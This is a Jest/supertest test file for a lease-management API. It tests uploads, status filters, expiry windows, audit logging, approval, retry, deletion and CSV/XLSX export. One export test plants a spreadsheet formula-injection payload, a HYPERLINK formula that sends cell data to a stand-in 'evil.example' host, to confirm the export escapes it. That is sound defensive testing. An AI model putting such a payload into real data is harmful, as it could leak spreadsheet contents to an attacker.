import request from "supertest";
import { app } from "../src/app.js";
import { Lease } from "../src/models/index.js";
import { authHeader, resetDb, signup } from "./testUtils.js";

beforeEach(resetDb);

async function makeLease(orgId, overrides = {}) {
  return Lease.create({
    orgId,
    originalFilename: "lease.pdf",
    storagePath: "/tmp/does-not-matter.pdf",
    contentType: "application/pdf",
    status: "extracted",
    landlordName: "Meridian Properties LLC",
    propertyAddress: "500 Harbor Way, Suite 12",
    monthlyRent: 5000,
    overallConfidence: 0.95,
    ...overrides,
  });
}

async function orgId(token) {
  const res = await request(app).get("/api/auth/me").set(authHeader(token));
  return res.body.org_id;
}

function isoDateDaysFromNow(days) {
  const d = new Date();
  d.setUTCDate(d.getUTCDate() + days);
  return d.toISOString().slice(0, 10);
}

test("upload rejects unsupported file type", async () => {
  const token = await signup(app, request);
  const res = await request(app)
    .post("/api/leases/upload")
    .set(authHeader(token))
    .attach("file", Buffer.from("hello"), { filename: "notes.txt", contentType: "text/plain" });
  expect(res.status).toBe(422);
});

test("upload requires a file", async () => {
  const token = await signup(app, request);
  const res = await request(app).post("/api/leases/upload").set(authHeader(token));
  expect(res.status).toBe(422);
});

test("upload creates a queued lease and lists it", async () => {
  const token = await signup(app, request);
  const res = await request(app)
    .post("/api/leases/upload")
    .set(authHeader(token))
    .attach("file", Buffer.from("%PDF-1.4 fake"), { filename: "lease.pdf", contentType: "application/pdf" });
  expect(res.status).toBe(201);
  expect(res.body.status).toBe("queued");

  const listRes = await request(app).get("/api/leases").set(authHeader(token));
  expect(listRes.status).toBe(200);
  expect(listRes.body.items.map((i) => i.id)).toContain(res.body.id);
});

test("list can filter by status and search by landlord name", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeLease(org, { status: "needs_review", landlordName: "Acme Realty Partners" });
  await makeLease(org, { status: "approved", landlordName: "Beta Property Group" });

  const filtered = await request(app).get("/api/leases?status=approved").set(authHeader(token));
  expect(filtered.body.items).toHaveLength(1);
  expect(filtered.body.items[0].landlord_name).toBe("Beta Property Group");

  const searched = await request(app).get("/api/leases?q=acme").set(authHeader(token));
  expect(searched.body.items).toHaveLength(1);
  expect(searched.body.items[0].landlord_name).toBe("Acme Realty Partners");
});

describe("expiring_within_days filter", () => {
  test("includes a lease whose expiration date is within the window", async () => {
    const token = await signup(app, request);
    const org = await orgId(token);
    const soon = await makeLease(org, { landlordName: "Expiring Lease Co", expirationDate: isoDateDaysFromNow(10) });

    const res = await request(app).get("/api/leases?expiring_within_days=90").set(authHeader(token));
    expect(res.status).toBe(200);
    expect(res.body.items.map((i) => i.id)).toContain(soon.id);
  });

  test("includes a lease whose renewal notice deadline is within the window, even if its expiration is far off", async () => {
    const token = await signup(app, request);
    const org = await orgId(token);
    const noticeDue = await makeLease(org, {
      landlordName: "Notice Due Co",
      expirationDate: isoDateDaysFromNow(400), // far off
      renewalNoticeDeadline: isoDateDaysFromNow(20), // the actually urgent date
    });

    const res = await request(app).get("/api/leases?expiring_within_days=90").set(authHeader(token));
    expect(res.status).toBe(200);
    expect(res.body.items.map((i) => i.id)).toContain(noticeDue.id);
  });

  test("excludes a lease with both dates outside the window", async () => {
    const token = await signup(app, request);
    const org = await orgId(token);
    await makeLease(org, {
      landlordName: "Far Out Co",
      expirationDate: isoDateDaysFromNow(400),
      renewalNoticeDeadline: isoDateDaysFromNow(300),
    });

    const res = await request(app).get("/api/leases?expiring_within_days=90").set(authHeader(token));
    expect(res.body.items).toHaveLength(0);
  });

  test("excludes a lease with neither date set", async () => {
    const token = await signup(app, request);
    const org = await orgId(token);
    await makeLease(org, { landlordName: "No Dates Co", expirationDate: null, renewalNoticeDeadline: null });

    const res = await request(app).get("/api/leases?expiring_within_days=90").set(authHeader(token));
    expect(res.body.items).toHaveLength(0);
  });
});

test("lease correction writes audit log", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const lease = await makeLease(org);

  let res = await request(app)
    .patch(`/api/leases/${lease.id}`)
    .set(authHeader(token))
    .send({ landlord_name: "Meridian Corrected LLC" });
  expect(res.status).toBe(200);
  expect(res.body.landlord_name).toBe("Meridian Corrected LLC");

  res = await request(app).get(`/api/leases/${lease.id}/audit-log`).set(authHeader(token));
  const actions = res.body.map((e) => e.action);
  expect(actions).toContain("human_correction");
});

test("correcting a field that doesn't actually change the value writes no audit log entry", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const lease = await makeLease(org);

  await request(app)
    .patch(`/api/leases/${lease.id}`)
    .set(authHeader(token))
    .send({ landlord_name: lease.landlordName });

  const res = await request(app).get(`/api/leases/${lease.id}/audit-log`).set(authHeader(token));
  expect(res.body.map((e) => e.action)).not.toContain("human_correction");
});

test("approve lease", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const lease = await makeLease(org);

  const res = await request(app).post(`/api/leases/${lease.id}/approve`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("approved");
});

test("cannot approve a lease still queued or processing", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const lease = await makeLease(org, { status: "queued" });

  const res = await request(app).post(`/api/leases/${lease.id}/approve`).set(authHeader(token));
  expect(res.status).toBe(409);
});

test("reject lease has no status restriction", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const lease = await makeLease(org, { status: "approved" });

  const res = await request(app).post(`/api/leases/${lease.id}/reject`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("rejected");
});

test("retrying a failed lease re-queues it and clears the error message", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const lease = await makeLease(org, { status: "failed", errorMessage: "OCR failed: boom" });

  const res = await request(app).post(`/api/leases/${lease.id}/retry`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("queued");
  expect(res.body.error_message).toBe("");

  const auditRes = await request(app).get(`/api/leases/${lease.id}/audit-log`).set(authHeader(token));
  expect(auditRes.body.map((e) => e.action)).toContain("retry_requested");
});

test("cannot retry an already-approved lease", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const lease = await makeLease(org, { status: "approved" });

  const res = await request(app).post(`/api/leases/${lease.id}/retry`).set(authHeader(token));
  expect(res.status).toBe(409);

  await lease.reload();
  expect(lease.status).toBe("approved"); // untouched
});

test("deleting a lease removes it from the list and detail views", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const lease = await makeLease(org);

  const res = await request(app).delete(`/api/leases/${lease.id}`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.ok).toBe(true);

  const listRes = await request(app).get("/api/leases").set(authHeader(token));
  expect(listRes.body.items.map((i) => i.id)).not.toContain(lease.id);

  const detailRes = await request(app).get(`/api/leases/${lease.id}`).set(authHeader(token));
  expect(detailRes.status).toBe(404);
});

test("deleting a lease is not blocked by its status -- e.g. an already-approved one", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const lease = await makeLease(org, { status: "approved" });

  const res = await request(app).delete(`/api/leases/${lease.id}`).set(authHeader(token));
  expect(res.status).toBe(200);
});

test("deleting the same lease twice, or one that never existed, 404s", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const lease = await makeLease(org);

  await request(app).delete(`/api/leases/${lease.id}`).set(authHeader(token));
  const again = await request(app).delete(`/api/leases/${lease.id}`).set(authHeader(token));
  expect(again.status).toBe(404);

  const bogus = await request(app).delete("/api/leases/not-a-real-id").set(authHeader(token));
  expect(bogus.status).toBe(404);
});

test("export csv", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeLease(org, { landlordName: "Acme Realty LLC" });

  const res = await request(app).get("/api/export/leases/csv").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.text).toContain("Acme Realty LLC");
});

test("export csv neutralizes formula-injection payloads", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeLease(org, { landlordName: '=HYPERLINK("http://evil.example/steal?x="&A1,"Click")' });

  const res = await request(app).get("/api/export/leases/csv").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.text).toContain('"\'=HYPERLINK(');
  expect(res.text).not.toContain('"=HYPERLINK(');
});

test("export xlsx responds successfully", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeLease(org);

  const res = await request(app).get("/api/export/leases/xlsx").set(authHeader(token));
  expect(res.status).toBe(200);
});
